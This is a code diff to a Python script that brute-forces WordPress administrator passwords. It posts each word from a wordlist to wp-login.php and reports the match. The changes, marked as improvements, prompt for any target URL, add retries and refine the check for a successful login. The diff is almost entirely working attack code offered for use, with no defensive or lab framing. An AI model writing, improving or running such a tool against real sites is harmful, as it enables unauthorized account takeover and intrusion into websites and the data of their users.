@@ -1,7 +1,11 @@
 import requests
+import os
+import time
 
-#Terminal color
+# Terminal color
 YELLOW = "\033[33m"
+GREEN = "\033[32m"
+RED = "\033[31m"
 RESET = "\033[0m"
 
 #ASCII art Header
@@ -13,21 +17,34 @@ print(YELLOW +"░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░�
 print(YELLOW +"░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░                ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░" + RESET)
 print(YELLOW +" ░▒▓█████████████▓▒░░▒▓█▓▒░                ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░   ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓█▓▒░      ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓████████▓▒░" + RESET)
 
-#Main Function
-url = "https://targetexample.com/wp-login.php"
-username = "admin"
-wordlist = "wordlist.txt"
+# -------------------------------
+# 1. Dynamic target input (Improvement)
+url = input("Enter target WP login URL: ").strip()  # ask user for URL
+username = input("Enter username: ").strip()        # ask user for username
+wordlist = input("Enter wordlist file path: ").strip()  # ask user for wordlist path
 
+# Check if wordlist exists
+if not os.path.isfile(wordlist):
+    print(f"[!] Wordlist '{wordlist}' not found!")
+    exit()
+
+# 2. Headers setup
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
     "Referer": url
 }
 
+# 3. Create session with error handling (Improvement)
 session = requests.Session()
-session.get(url, headers=headers)  # get initial cookie
+try:
+    session.get(url, headers=headers, timeout=10)  # get initial cookie
+except requests.exceptions.RequestException as e:
+    print(f"[!] Failed to connect to {url}: {e}")
+    exit()
 
 print(f"[+] Start bruteforce to {url} with username: {username}")
 
+# 4. Open wordlist and try passwords
 with open(wordlist, "r") as file:
     for password in file:
         password = password.strip()
@@ -39,14 +56,23 @@ with open(wordlist, "r") as file:
             "testcookie": "1"
         }
 
-        try:
-            response = session.post(url, data=data, headers=headers, timeout=10, allow_redirects=True)
-        except requests.exceptions.RequestException as e:
-            print(f"[!] Error connection: {e}")
+        # POST request with retry (Improvement)
+        for attempt in range(3):
+            try:
+                response = session.post(url, data=data, headers=headers, timeout=10, allow_redirects=True)
+                break
+            except requests.exceptions.RequestException as e:
+                print(f"[!] Connection error, attempt {attempt+1}: {e}")
+                time.sleep(2)
+        else:
+            print(f"[!] Skipping password '{password}' due to repeated connection failures")
             continue
 
-        if "dashboard" in response.text.lower() or "wp-admin" in response.url:
-            print(f"[✓] Password found: {password}")
+        # Check login success more reliably (Improvement)
+        if "wp-login.php" not in response.url:
+            print(f"{GREEN}[✓] Password found: {password}{RESET}")
             break
         else:
-            print(f"[-] Wrong: {password}")
+            print(f"{RED}[-] Wrong: {password}{RESET}")
+
+print("[+] Bruteforce finished.")
